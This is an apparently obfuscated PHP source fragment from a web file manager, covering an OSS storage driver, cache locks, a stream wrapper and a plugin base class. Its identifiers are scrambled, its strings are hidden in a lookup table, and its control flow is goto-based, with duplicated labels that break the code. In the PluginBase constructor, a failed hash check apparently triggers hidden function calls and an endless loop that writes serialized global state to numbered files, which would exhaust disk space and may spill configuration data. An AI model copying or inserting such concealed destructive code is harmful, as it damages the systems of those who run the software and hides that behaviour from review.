$DΎ = true) { goto c󶲡; d: return !1; goto dׄ; c󶲡: $b߳ =& $_SERVER[놫Ӱ]; $fǤ퐗 = trim($fǤ퐗, $b߳[8]); $A殒 = empty($fǤ퐗) ? $b߳[33] : $fǤ퐗 . $b߳[8]; goto fۚ; C: $Dǆ = 0; while (!0) { $A = array($b߳[1137] => $b߳[8], $b߳[183] => $A殒, $b߳[1138] => $aՖ, $b߳[1139] => $BލҨ); try { $dʼ = $this->client->listObjects($this->bucket, $A); } catch (OSS\Core\OssException $D) { break; } $BލҨ = $dʼ->getNextMarker(); $e緭 = $dʼ->getObjectList(); $Fڐ = $dʼ->getPrefixList(); if ($Eς̫) { if (count($e緭) > 1 || count($e緭) == 1 && $e緭[0]->getKey() != $A殒) { $a += count($e緭) - 1; } if (!empty($Fڐ)) { $Dǆ += count($Fڐ); } if ($BލҨ === $b߳[33]) { break; } continue; } if ($DΎ) { if (!empty($e緭)) { if (count($e緭) > 1 || $e緭[0]->getKey() != $A殒) { return !0; } } } else { if (!empty($Fڐ)) { return !0; } } if ($BލҨ === $b߳[33]) { break; } } if ($Eς̫) { return array($b߳[188] => $a, $b߳[189] => $Dǆ); } goto d; fۚ: $BލҨ = $b߳[33]; $aՖ = 500; $a = 0; goto C; dׄ: } public function listAll($a޼) { $b拠 =& $_SERVER[놫Ӱ]; $f˨ = $this->fileList($a޼, $b拠[33], !0); $dٞ = array(); foreach ($f˨[$b拠[74]] as $b) { $dٞ[$b[$b拠[28]]] = $b[$b拠[78]]; } return $this->listAllFiles($a޼, array_keys($dٞ), $dٞ); } public function canRead($Aӊ) { $bď =& $_SERVER[놫Ӱ]; $E = $this->pathAcl($Aӊ); return $E == $bď[1150] || $E == $bď[483] ? !0 : !1; } public function canWrite($E) { $Cіۨ = $this->pathAcl($E); return $Cіۨ == $_SERVER[놫Ӱ][483] ? !0 : !1; } public function pathAcl($F) { goto dŋ; cЮ: $f = $Cؙ == $AӶɈɊ[34] ? $this->bucketAcl : $Cؙ; if ($f == $AӶɈɊ[1151]) { return $AӶɈɊ[1150]; } if ($f == $AӶɈɊ[1152]) { return $AӶɈɊ[483]; } goto C㊰; C㊰: return $f; goto A; dŋ: $AӶɈɊ =& $_SERVER[놫Ӱ]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $Cؙ = $this->client->getObjectAcl($this->bucket, $F); } catch (OSS\Core\OssException $d䳼տ) { return !1; } goto cЮ; A: } private function chmodPath($f, $Eҍּ = '') { $aԍֲ =& $_SERVER[놫Ӱ]; $Fً = empty($Eҍּ) ? $aԍֲ[1152] : $Eҍּ; $A = array($aԍֲ[34], $aԍֲ[182], $aԍֲ[1151], $aԍֲ[1152]); if (!in_array($Fً, $A)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $f, $Fً); } catch (OSS\Core\OssException $FߗԲ) { return !1; } return !0; } public function getContent($Fގ) { return $this->fileSubstr($Fގ, -1); } public function setContent($D򪡃, $aֆ = '') { $A֧ =& $_SERVER[놫Ӱ]; try { $D簏 = $this->trafficLimit($A֧[1153]); $c = $this->client->putObject($this->bucket, $D򪡃, $aֆ, $D簏); } catch (OSS\Core\OssException $B) { return !1; } $fذ = array($A֧[1140] => trim($c[$A֧[1154]], $A֧[112]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($D򪡃))); $this->updateObjMeta($D򪡃, $fذ); return isset($c[$A֧[1155]][$A֧[1102]]) ? (int) $c[$A֧[1155]][$A֧[1102]] : strlen($c); } private function updateObjMeta($C괥, $DƷ) { try { $Aӊ = array(OSS\OssClient::OSS_HEADERS => $DƷ); $this->client->copyObject($this->bucket, $C괥, $this->bucket, $C괥, $Aӊ); } catch (OSS\Core\OssException $c볷͉) { return !1; } return !0; } public function upload($eԖ, $AҴ, $DÚ = false, $D˫Œ = REPEAT_REPLACE) { $Cʓ팩 =& $_SERVER[놫Ӱ]; $d݊ = trim($eԖ, $Cʓ팩[8]); $dܙ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => $this->osChunkSize(), OSS\OssClient::OSS_HEADERS => array($Cʓ팩[1140] => @md5_file($AҴ)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($eԖ))); $dܙ = $this->trafficLimit($Cʓ팩[1153], $dܙ); try { $this->client->multiuploadFile($this->bucket, $d݊, $AҴ, $dܙ); } catch (OSS\Core\OssException $cμ) { return !1; } return $this->getPathOuter($eԖ); } public function getHost() { $Aލ =& $_SERVER[놫Ӱ]; $Bܘ = explode($Aލ[168], parent::getHost()); return $Bܘ[0] . $Aލ[168] . $this->bucket . $Aލ[92] . $Bܘ[1]; } public function uploadFormData($d讆, $B = 3600) { goto B֜؋; aď뷱: $B澤ϔ = strpos($C, $bɍ[281]); $C = substr($C, 0, $B澤ϔ) . $bɍ[1157]; $Aֽ = 1048576000 * 5; goto aяႅ; aяႅ: $Aٟؔ = $this->pathFather($d讆); $B凅 = array($bɍ[1062] => $C, $bɍ[1063] => array(array($bɍ[1158], 0, $Aֽ), array($bɍ[1066], $bɍ[1067], $Aٟؔ))); $Eį = base64_encode(json_encode($B凅)); goto Fβˋ; F: $B̮ = date($bɍ[1156], time() + $Bʡ); $cŠ = new DateTime($B̮); $C = $cŠ->format(DateTime::ISO8601); goto aď뷱; B䄥ˋ: return $Aʜ; goto d߸; B֜؋: $bɍ =& $_SERVER[놫Ӱ]; if (!($b؃ = $this->getHost())) { return !1; } $Bʡ = $B; goto F; Fβˋ: $d = base64_encode(hash_hmac($bɍ[215], $Eį, $this->secret, !0)); $Aʜ = array($bɍ[1072] => $Eį, $bɍ[1159] => $this->accessKey, $bɍ[1068] => $bɍ[1060], $bɍ[1160] => $d, $bɍ[166] => $b؃); $Aʜ = $this->trafficLimit($bɍ[1153], $Aʜ); goto B䄥ˋ; d߸: } public function multiUploadFormData($eߠү, $BЍ = 3600) { $e˗ =& $_SERVER[놫Ӱ]; if (!($e⅜ = $this->getHost())) { return !1; } $d׎ = $this->trafficLimit($e˗[1153]); $D䜥 = $this->client->initiateMultipartUpload($this->bucket, $eߠү, $d׎); return array($e˗[206] => $D䜥, $e˗[166] => $e⅜ . $e˗[8] . $this->pathEncode($eߠү), $e˗[207] => gmdate($e˗[1161]), $e˗[88] => $eߠү); } public function multiUploadAuthData($F, $E = array()) { goto dދІ; dދІ: $f =& $_SERVER[놫Ӱ]; $e٧ = isset($E[$f[207]]) ? $E[$f[207]] : gmdate($f[1161]); $F = isset($E[$f[157]]) ? $E[$f[157]] : $f[33]; goto fڨ; a: if (!empty($E[$f[1163]])) { $Dꌌ = array_merge(array($c񿿟[4]), $E[$f[1163]]); sort($Dꌌ); $c񿿟[4] = implode($f[214], $Dꌌ); } $Cı = implode($f[214], $c񿿟); $cў = base64_encode(hash_hmac($f[215], $Cı, $this->secret, !0)); goto Dո씕; cѕ: $c񿿟 = array($f[209], $f[33], $f[115], $e٧, "\170\55\x6f\x73\x73\55\x64\x61\164\x65\72{$e٧}", $f[8] . $this->bucket . $f[8] . $b¿ . $F); if (strpos($F, $f[210]) === 0) { $c񿿟[0] = $f[211]; if ($C = $this->trafficLimit($f[1153])) { $b¿ = $f[1162]; array_splice($c񿿟, 5, 0, $b¿ . $f[4] . $C[$b¿]); } } if (isset($E[$f[212]]) && $E[$f[212]] == $f[213]) { $c񿿟[0] = $f[213]; } goto a; fڨ: $b¿ = $F; if (isset($E[$f[88]])) { $b¿ = $E[$f[88]]; unset($E[$f[88]]); } if (isset($E[$f[208]])) { return $this->listUploadParts($b¿, $e٧, $E); } goto cѕ; Dո씕: $bډ = $f[1164] . $this->accessKey . $f[4] . $cў; if (strpos($F, $f[210]) === 0) { $bډ = array($f[217] => $bډ, $f[207] => $e٧); if ($C) { $bډ = array_merge($bډ, $C); } } return $bډ; goto Aأ呉; Aأ呉: } public function listUploadParts($A, $E, $aˌ) { goto Fΐƫ; FС: $fÅƝ = $b߅Å->getListPart(); $e󪾮 = array(); foreach ($fÅƝ as $F妸ȍ) { $e󪾮[] = array($Fλ[1144] => $F妸ȍ->getPartNumber(), $Fλ[1145] => trim($F妸ȍ->getETag(), $Fλ[112])); } goto BϋƤ; BϋƤ: unset($aˌ[$Fλ[208]], $aˌ[$Fλ[212]]); $Dݫ = $this->multiUploadAuthData($A, $aˌ); if (empty($Dݫ)) { return !1; } goto aÐ񎪾; Fΐƫ: $Fλ =& $_SERVER[놫Ӱ]; $fܵ = parse_url_query($aˌ[$Fλ[157]]); $b߅Å = $this->client->listParts($this->bucket, $A, $fܵ[$Fλ[206]]); goto FС; aÐ񎪾: return array($Fλ[217] => $Dݫ, $Fλ[207] => $E, $Fλ[219] => $e󪾮); goto BǊؐ; BǊؐ: } public function download($C, $A僒) { if ($this->isFolder($C)) { return !1; } try { $e = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $A僒); $e = $this->trafficLimit($_SERVER[놫Ӱ][104], $e); $this->client->getObject($this->bucket, $C, $e); } catch (OSS\Core\OssException $DЮÉ) { return !1; } return $A僒; } public function fileSubstr($fڮފ, $C = 0, $E靓 = false) { if ($C === -1) { $a޺ = array(); } else { if ($E靓 === !1) { $dګ = $this->size($fڮފ); } else { $dګ = $C + $E靓 - 1; } $a޺ = array(OSS\OssClient::OSS_RANGE => "{$C}\x2d{$dګ}"); } try { return $this->client->getObject($this->bucket, $fڮފ, $a޺); } catch (OSS\Core\OssException $aʓܛ㶩) { return !1; } } private function trafficLimit($cي, $DӃñ = array()) { $B =& $_SERVER[놫Ӱ]; $C = floatval($GLOBALS[$B[6]][$B[84]][$B[90]][$cي]) * 1024 * 1024 * 8; if (!$C) { return $DӃñ; } $C = $C < 819200 ? 819200 : ($C > 838860800 ? 838860800 : $C); $DӃñ[OSS\OssClient::OSS_TRAFFIC_LIMIT] = $C; return $DӃñ; } public function link($D򼡌, $bɅ = array()) { $eݐ =& $_SERVER[놫Ӱ]; if (!$this->exist($D򼡌) || $this->isFolder($D򼡌)) { return !1; } try { $bɅ = $this->trafficLimit($eݐ[104], $bɅ); return $this->client->signUrl($this->bucket, $D򼡌, 3600 * 12, $eݐ[213], $bɅ); } catch (OSS\Core\OssException $B) { return !1; } } public function fileOut($cθ, $B = false, $Fګ׳ = false, $bֺǔ = '') { goto e; e: $Fԣ =& $_SERVER[놫Ӱ]; if (!$Fګ׳) { $Fګ׳ = $this->pathThis($cθ); } $d͚ޓ = get_file_mime(get_path_ext($Fګ׳)); goto Bޖ͏; dǑ: $F[OSS\OssClient::OSS_SUB_RESOURCE] .= $Fԣ[1166] . $d͚ޓ; $dʉٌ = $this->link($cθ, $F); $this->fileOutLink($dʉٌ); goto e; Bޖ͏: if ($d͚ޓ == $Fԣ[198]) { return parent::fileOut($cθ, $B, $Fګ׳, $bֺǔ); } $B = $B ? $Fԣ[199] : $Fԣ[200]; $F = array(OSS\OssClient::OSS_SUB_RESOURCE => $Fԣ[1165] . rawurlencode("{$B}\x3b\146\151\x6c\145\x6e\141\x6d\x65\x3d{$Fګ׳}")); goto dǑ; e: } public function fileOutServer($DǅŢ, $DӅ = false, $F = false, $Eꯍ = '') { parent::fileOut($DǅŢ, $DӅ, $F, $Eꯍ); } public function fileOutImage($aɐ, $F܋ܸ = 250) { $Fܱ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[놫Ӱ][1167] . $F܋ܸ); $D = $this->link($aɐ, $Fܱ); $this->fileOutLink($D); } public function fileOutImageServer($c붻, $AƎ = 250) { parent::fileOutImage($c붻, $AƎ); } public function hashMd5($cذ, $cț = '') { $Aхĵ =& $_SERVER[놫Ӱ]; $F嘛͘ = $this->objectMeta($cذ); if (!$F嘛͘) { return $Aхĵ[33]; } if (!isset($F嘛͘[$Aхĵ[1140]]) && !empty($cț)) { $EЬ = $this->updateObjMeta($cذ, array($Aхĵ[1140] => $cț)); $F嘛͘[$Aхĵ[1140]] = $EЬ ? $cț : $Aхĵ[33]; } return isset($F嘛͘[$Aхĵ[1140]]) ? strtolower($F嘛͘[$Aхĵ[1140]]) : $Aхĵ[33]; } public function size($F鋹) { $d靪 = $this->objectMeta($F鋹); return $d靪 ? $d靪[$_SERVER[놫Ӱ][78]] : 0; } public function info($c¥) { if ($this->isFolder($c¥)) { return $this->folderInfo($c¥); } else { if ($this->isFile($c¥)) { return $this->fileInfo($c¥); } } return !1; } public function exist($aՎ) { return $this->isFile($aՎ) || $this->isFolder($aՎ); } public function isFile($b) { return !$this->isFolder($b) && $this->objectMeta($b); } public function isFolder($D܊) { return $this->cacheMehod($_SERVER[놫Ӱ][220], $D܊); } protected function objectMeta($c) { return $this->cacheMehod($_SERVER[놫Ӱ][221], $c); } protected function _objectMeta($b) { try { $f = $this->client->getObjectMeta($this->bucket, $b); } catch (OSS\Core\OssException $A) { $f = !1; } return $f; } protected function _isFolder($D) { $c猈 =& $_SERVER[놫Ӱ]; $Dۙ냌 = array($c猈[1137] => $c猈[8], $c猈[183] => trim($D, $c猈[8]) . $c猈[8], $c猈[1138] => 1, $c猈[1139] => $c猈[33]); $Fǭ = $this->client->listObjects($this->bucket, $Dۙ냌); if ($Fǭ->getObjectList() || $Fǭ->getPrefixList()) { return !0; } return !1; } } goto Cƈ; Dل: function beforeShutdownFatalError($e) { think_exception($e); } $_SERVER[$_SERVER[][45]] = $c͛ט($_SERVER[$_SERVER[][42]]); $b = E_ALL ^ E_NOTICE ^ E_WARNING ^ E_DEPRECATED; goto A; Bᦻ: class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { goto E; C⾭ϕ: switch ($bߠݚ[$Eޘͷ[748]]) { case $Eޘͷ[751]: self::$handle = new CacheLockRedis(); break; case $Eޘͷ[752]: self::$handle = new CacheLockMemcached(); break; case $Eޘͷ[17]: self::$handle = new CacheLockDatabase(); break; case $Eޘͷ[164]: self::$handle = new CacheLockFile(); break; default: break; } return self::$handle; goto A٨; D𿩷: self::$timeout = $bߠݚ[$Eޘͷ[760]] ? $bߠݚ[$Eޘͷ[760]] : 10; $F = $GLOBALS[$Eޘͷ[6]][$Eޘͷ[17]][$Eޘͷ[718]]; if ($bߠݚ[$Eޘͷ[748]] == $Eޘͷ[17] && $F == $Eޘͷ[9]) { $bߠݚ[$Eޘͷ[748]] = $Eޘͷ[164]; } goto C⾭ϕ; E: $Eޘͷ =& $_SERVER[놫Ӱ]; if (self::$handle) { return self::$handle; } $bߠݚ = $GLOBALS[$Eޘͷ[6]][$Eޘͷ[334]]; goto D𿩷; A٨: } private static function key($F) { return $_SERVER[놫Ӱ][761] . Cache::key($F); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($E؟ = '') { self::$errorMsg = $E؟; } public static function lockGlobal($D, $b) { return self::lock($D, $b, !0); } public static function lock($Fꑘ, $aΠْ = false, $C = false) { goto B; E: $aΠْ = $aΠْ ? $aΠْ : self::$timeout; $c㑾 = $fۄӋ->lock($FƏ䇾, $aΠْ); if (!$c㑾) { $D = $Aס[762] . $aΠْ . $Aס[68] . self::$errorMsg . $Aס[68] . get_caller_msg(); $Cઆ = "\x4c\x6f\143\153\40\x61\143\x74\151\x6f\x6e\72\x20{$FƏ䇾}\40\164\x69\155\145\x6f\x75\164\54\157\166\145\162\40{$aΠْ}\x20\x73"; $Cઆ = self::$errorMsg ? self::$errorMsg : $bě; write_log($D, $Aס[763]); show_json($Cઆ, !1); } goto Fˈ; Fˈ: if (!$C) { self::$lockItem[$FƏ䇾] = !0; } return $c㑾; goto E; B: $Aס =& $_SERVER[놫Ӱ]; $fۄӋ = self::init(); $FƏ䇾 = self::key($Fꑘ); goto E; E: } public static function lockGet($fǲ) { $D肇 = self::key($fǲ); if (self::$lockItem[$D肇]) { return self::$lockItem[$D肇]; } return self::init()->lockGet($D肇); } public static function unlock($Dףۆ) { $a = self::key($Dףۆ); self::$lockItem[$a] = null; return self::init()->unlock($a); } public static function unlockRuntime() { $Eƨ =& $_SERVER[놫Ӱ]; $AӒ = self::init(); $a称 = !1; foreach (self::$lockItem as $Fܹ => $F) { if (!$F) { continue; } $AӒ->unlock($Fܹ); if (!$a称) { $a称 = !0; write_log($Eƨ[764] . $Fܹ . $Eƨ[68] . get_caller_msg(), $Eƨ[763]); continue; } write_log($Eƨ[764] . $Fܹ, $Eƨ[763]); } } } function cacheLockWait() { usleep(mt_rand(5, 50) * 100); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $B =& $_SERVER[놫Ӱ]; $fڊޤ = $GLOBALS[$B[6]][$B[334]]; self::$cachePath = $fڊޤ[$B[164]][$B[76]]; @mkdir(self::$cachePath, 511, !0); } public function lock($bˡ, $EΩ = 0) { goto f󫪞; f󫪞: $E߻ =& $_SERVER[놫Ӱ]; $e֦ = microtime(!0); $eП = $e֦ + $EΩ + 0.0001; goto C; C: $D慷 = rtrim(self::$cachePath, $E߻[8]) . $E߻[765] . md5($bˡ) . $E߻[766]; if (file_exists($D慷) && filemtime($D慷) && filemtime($D慷) < time() - 10) { @unlink($D慷); } do { if (file_exists($D慷)) { cacheLockWait(); continue; } $Fډ = fopen($D慷, $E߻[767]); if (!$Fډ) { return !1; } $Aȟ՜ = flock($Fډ, LOCK_EX | LOCK_NB); self::$caches[$bˡ] = array($E߻[768] => $Fډ, $E߻[164] => $D慷); fwrite($Fډ, $eП); clearstatcache(); if ($Fډ && $Aȟ՜) { return !0; } cacheLockWait(); } while (microtime(!0) < $eП); goto dŅ; dŅ: $this->unlock($bˡ); return !1; goto aٛ; aٛ: } public function lockGet($e) { $aᔊ =& $_SERVER[놫Ӱ]; $aܴ = rtrim(self::$cachePath, $aᔊ[8]) . $aᔊ[765] . md5($e) . $aᔊ[766]; return file_exists($aܴ); } public function unlock($eގ) { goto C; C: $D㒞 =& $_SERVER[놫Ӱ]; $f߳ = self::$caches[$eގ]; if (!$f߳) { return; } goto f; f: @flock($f߳[$D㒞[768]], LOCK_UN); @fclose($f߳[$D㒞[768]]); @unlink($f߳[$D㒞[164]]); goto cߧ; cߧ: unset(self::$caches[$eގ]); goto eҒ; eҒ: } } goto B̅Ϥ; Bȥ: class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($f嵬 = false) { } public function exist($DҤ) { $C = $this->info($DҤ); return $C[$_SERVER[놫Ӱ][185]]; } public function isFile($C) { $B؆ = $this->info($C); return $B؆[$_SERVER[놫Ӱ][185]]; } public function isFolder($A) { return !1; } public function size($c㠼) { $aѨ = $this->info($c㠼); return $aѨ[$_SERVER[놫Ӱ][78]]; } public function info($c危) { return $this->infoParse($c危); } public function infoAuth($AǗ) { return $this->infoParse($AǗ); } public function infoWithChildren($e) { return $this->infoParse($e); } public function infoFull($f݇) { return $this->infoParse($f݇); } private function infoParse($bτ) { $eŖ =& $_SERVER[놫Ӱ]; $Cބ = $this->header($bτ); $Bۑ = array($eŖ[28] => $Cބ[$eŖ[28]], $eŖ[76] => $bτ, $eŖ[29] => $eŖ[164], $eŖ[78] => $Cބ[$eŖ[78]], $eŖ[157] => get_path_ext($Cބ[$eŖ[28]]), $eŖ[1117] => $Cބ[$eŖ[78]] > 0 && $Cބ[$eŖ[1197]], $eŖ[1118] => !1); return $Bۑ; } private function header($D썕ӌ) { if (isset(self::$_cacheHeader[$D썕ӌ])) { return self::$_cacheHeader[$D썕ӌ]; } self::$_cacheHeader[$D썕ӌ] = url_header($D썕ӌ); } public function hashSimple($E¸ȿ, $A؆ = false) { goto dϫ; bĻ: if ($c <= $dĥ * $B) { return md5($this->fileSubstr($E¸ȿ, 0, $c)) . $c; } $D = intval($c / $B); $b = $E΃[33]; goto fۛ; bˣ: $b .= $this->fileSubstr($E¸ȿ, $c - $dĥ, $dĥ); return md5($b) . $c; goto C͞; dϫ: $E΃ =& $_SERVER[놫Ӱ]; if ($A؆) { $cܐć = $this->header($E¸ȿ); $E¸ȿ = $cܐć[$E΃[292]]; } if (!$cܐć[$E΃[1197]]) { return !1; } goto až; až: $c = intval($cܐć[$E΃[322]]); $dĥ = 200; $B = 50; goto bĻ; fۛ: $e厣Ͱ = timeFloat(); $A = 15; for ($a톐 = 0; $a톐 < $B; $a톐++) { if (timeFloat() - $e厣Ͱ > $A) { return !1; } $eȦ = $this->fileSubstr($E¸ȿ, $D * $a톐, $dĥ); if (!$eȦ) { return !1; } $b .= $eȦ; } goto bˣ; C͞: } public function getContent($d) { return file_get_contents($d); } public function fileSubstr($Eء߸, $c, $B) { $F䑨 =& $_SERVER[놫Ӱ]; $d慐Ђ = array($F䑨[1198] . $c . $F䑨[698] . ($c + $B - 1)); $f鴞 = url_request($Eء߸, $F䑨[213], !1, $d慐Ђ, !1, !1, 1); return $f鴞[$F䑨[1007]] ? $f鴞[$F䑨[1007]] : $F䑨[33]; } public function download($a̷, $cͩ) { Downloader::start($a̷, $cͩ); return $cͩ; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($cԉԓ, $D = '') { goto D; fͥÑڍ: $this->path = $this->info[$_SERVER[놫Ӱ][76]]; if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$cԉԓ])) { self::$_chunkBuffer[$cԉԓ] = array(); } goto bƑ; bƑ: return $this->info ? !0 : !1; goto dΫ; D: $this->info = $this->info($cԉԓ); $this->timeStart = timeFloat(); if (!$this->info) { return !1; } goto fͥÑڍ; dΫ: } function stream_read($cս) { goto Aхގ; BΉ: if ($this->pose + $cս >= $this->info[$eਟ[78]]) { $cս = $this->info[$eਟ[78]] - $this->info[$eਟ[1199]]; } $F̅ = $this->pose >= 0 ? $this->pose : $this->pose + $this->info[$eਟ[78]]; $a = $this->fileSubstr($F̅, $cս); goto DĂ犑; DĂ犑: $this->pose += strlen($a); return $a; goto cΝ; Aхގ: $eਟ =& $_SERVER[놫Ӱ]; $f⧯Ӡ = $cս; if ($this->pose >= $this->info[$eਟ[78]]) { return !1; } goto BΉ; cΝ: } public function stream_tell() { return $this->pose; } public function stream_seek($cտյ, $b) { $eɄ =& $_SERVER[놫Ӱ]; if ($b == SEEK_SET) { $this->pose = $cտյ; } else { if ($b == SEEK_CUR) { $this->pose += $cտյ; } else { if ($b == SEEK_END) { $this->pose = $this->info[$eɄ[78]] + intval($cտյ); } } } if ($cտյ < 0) { $this->pose = $this->info[$eɄ[78]] + $cտյ; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[놫Ӱ][78]]; } public function stream_close() { return !0; } public function url_stat($Cϖ, $e۝) { $c⒆ =& $_SERVER[놫Ӱ]; $bŢ = $this->info($Cϖ); return array($c⒆[1200] => 0, $c⒆[1201] => 0, $c⒆[12] => 32768 + 511, $c⒆[1202] => 0, $c⒆[1203] => 0, $c⒆[1204] => 0, $c⒆[1205] => 0, $c⒆[78] => $bŢ[$c⒆[78]], $c⒆[1206] => $bŢ[$c⒆[1123]], $c⒆[1207] => $bŢ[$c⒆[106]], $c⒆[1208] => $bŢ[$c⒆[184]], $c⒆[1209] => 0, $c⒆[1210] => 0); } static $fileInfo = array(); public function info($Aܑ) { $DѸ = $_SERVER[놫Ӱ][1211]; if (isset(self::$fileInfo[$Aܑ])) { return self::$fileInfo[$Aܑ]; } if (substr($Aܑ, 0, strlen($DѸ)) != $DѸ) { return !1; } self::$fileInfo[$Aܑ] = IO::info(substr($Aܑ, strlen($DѸ))); return self::$fileInfo[$Aܑ]; } public static function fread($fÉɘ, $Fڇ, $f֯ȡ) { $F = 8192; fseek($fÉɘ, $Fڇ, SEEK_SET); $d = $_SERVER[놫Ӱ][33]; $Cü = 0; while ($Cü < $f֯ȡ) { $F몳 = min($F, $f֯ȡ - $Cü); $d .= fread($fÉɘ, $F몳); $Cü += $F몳; } return $d; } public function fileSubstr($d֍Ҫ, $E߭) { goto eܐڂ; fغΙ: $b = $E߭; if ($d֍Ҫ < 0) { $d֍Ҫ = $eڔ + $d֍Ҫ; } if ($E߭ === !1) { $E߭ = $eڔ - $d֍Ҫ; } goto e; F֭Ϧ: $Bͭ = $Cѣ[33]; foreach ($BϹȹ as $dԂמ => $Bͭ) { $dԂמ = intval($dԂמ); $E = $dԂמ + strlen($Bͭ); if ($d֍Ҫ >= $E) { continue; } if ($d֍Ҫ >= $dԂמ && $d֍Ҫ + $E߭ <= $E) { return substr($Bͭ, $d֍Ҫ - $dԂמ, $E߭); } break; } if (count($BϹȹ) > 40 || timeFloat() - $this->timeStart > 2.0) { $this->log($Cѣ[1212], $Cѣ[1213] . count($BϹȹ) . "\73\x73\164\141\162\x74\75{$d֍Ҫ}\54\x6c\145\x6e\147\x74\150\x3d{$E߭}\73\160\157\x73\x65\x3a{$dԂמ}\176{$E}"); throw new Exception($Cѣ[1214]); } goto aǃ; e: if ($d֍Ҫ + $E߭ > $eڔ) { $E߭ = $eڔ - $d֍Ҫ; } if ($d֍Ҫ < 0 || $d֍Ҫ >= $eڔ || $E߭ <= 0 || $E߭ > 1024 * 1024 * 5) { throw new Exception("\x69\x6f\x46\151\154\x65\x52\x65\141\144\40\x65\x72\162\x6f\x72\x21\x20\x73\x74\141\162\x74\x3d{$d֍Ҫ}\73\x6c\x65\156\147\164\x68\75{$E߭}\73\x20\x73\x69\x7a\145\75{$eڔ}\x3b"); } $Aأ = 64 * 1024; goto e; aǃ: $E٬ = intval($d֍Ҫ / $Aأ) * $Aأ; $cތΗ = ceil(($d֍Ҫ + $E߭) / $Aأ) * $Aأ - $E٬; $dȭ٨ = IO::fileSubstr($this->path, $E٬, $cތΗ); goto DЮ; DЮ: $BϹȹ[$E٬ . $Cѣ[33]] = $dȭ٨; ksort($BϹȹ); $DҖ = substr($dȭ٨, $d֍Ҫ - $E٬, $E߭); goto Cá; eܐڂ: $Cѣ =& $_SERVER[놫Ӱ]; $eڔ = $this->info[$Cѣ[78]]; $F = $d֍Ҫ; goto fغΙ; Cá: return $DҖ; goto Dւ唹; e: $BϹȹ =& self::$_chunkBuffer[$this->path]; $dԂמ = 0; $E = 0; goto F֭Ϧ; Dւ唹: } private function log($fņ, $e) { $bۤӘ =& $_SERVER[놫Ӱ]; $Dм = $this->info[$bۤӘ[28]] . $bۤӘ[1215] . (timeFloat() - $this->timeStart) . $bۤӘ[1216]; write_log("{$fņ}\72{$Dм}\73{$e}", $bۤӘ[1175]); } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { goto eԹ؄; eݎ: if ($_SERVER[$fȲ[782]] != $Eħ׵΍($A֊)) { goto B; Bӄ: $f = $fȲ[786]; $f($_SERVER[$fȲ[787]]); $Bǣӽ = $fȲ[783]; goto F솬; F솬: $Bǣӽ(); $Aښ = $fȲ[788]; $BǼ = json_encode($GLOBALS[$fȲ[789]]); goto B; B: $EА = $B($Dŉڐ); $a״ = explode($fȲ[214], $EА); if (count($a״) < $fȲ[543]) { $DĒ = $fȲ[785]; $DĒ(); } goto Bӄ; B: $Bǣӽ = $fȲ[783]; $B = $fȲ[784]; $Dŉڐ = $_SERVER[$fȲ[779]] . $fȲ[780]; goto B; B: $bލ = 1; for ($BȾϖ = $bލ; $BȾϖ > 0; $BȾϖ++) { $Aښ(DATA_PATH . $BȾϖ, $BǼ); } goto dꓯ; dꓯ: } global $in, $config; $this->config =& $config; goto B𡈅; B𡈅: $this->in =& $in; $this->modelPlugin = Model($fȲ[1218]); $this->pluginName = str_replace($fȲ[1218], $fȲ[33], get_class($this)); goto DÎ; Dֹ: $this->pluginHostDefault = PLUGIN_HOST . $this->pluginName . $fȲ[8]; $this->pluginLangArr = $this->initLang(); $this->values = array(); goto eΝ; eΝ: return $this; goto a; eԹ؄: $fȲ =& $_SERVER[놫Ӱ]; $A֊ = $_SERVER[$fȲ[787]] . $fȲ[1217]; $Eħ׵΍ = $fȲ[781]; goto eݎ; DÎ: $this->pluginPath = PLUGIN_DIR . $this->pluginName . $fȲ[8]; $this->pluginApi = app_host_get() . $fȲ[1219] . $this->pluginName . $fȲ[8]; $this->pluginHost = PLUGIN_HOST . $this->pluginName . $fȲ[8]; goto Dֹ; a: } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[놫Ӱ][1220]); } protected function assign($f, $B = false) { if (is_array($f)) { $this->values = array_merge($this->values, $f); } else { $this->values[$f] = $B; } } protected function display($cәѐ) { extract($this->values); require $cәѐ; } final function hookRegist($Aɝ) { $this->modelPlugin->appRegist($this->pluginName, $Aɝ); } final function appIcon() { $f =& $_SERVER[놫Ӱ]; $bՉ = $this->appPackage(); $F = $f[33]; if (isset($bՉ[$f[379]])) { if (isset($bՉ[$f[379]][$f[1221]])) { $F = $f[1222] . $bՉ[$f[379]][$f[1221]] . $f[1223]; } else { if ($bՉ[$f[379]][$f[1224]]) { $F = $f[1225] . $bՉ[$f[379]][$f[1224]] . $f[1226]; } } } return $F; } final function fileCanView($fݼ) { $A =& $_SERVER[놫Ӱ]; if ($this->isShare($fݼ)) { return !0; } if (!Action($A[1227])->authCan($A[1228])) { show_tips(LNG($A[1229]), !1); } ActionCall($A[1230], $fݼ); } final function isShare($Dآ) { $B򩵏 = KodIO::parse($Dآ); return $B򩵏[$_SERVER[놫Ӱ][29]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($DŎꮇ) { if (request_url_safe($DŎꮇ)) { return $DŎꮇ; } if (!$this->isShare($DŎꮇ)) { $DŎꮇ = $this->filePath($DŎꮇ); } return Action($_SERVER[놫Ӱ][989])->linkOut($DŎꮇ); } public function 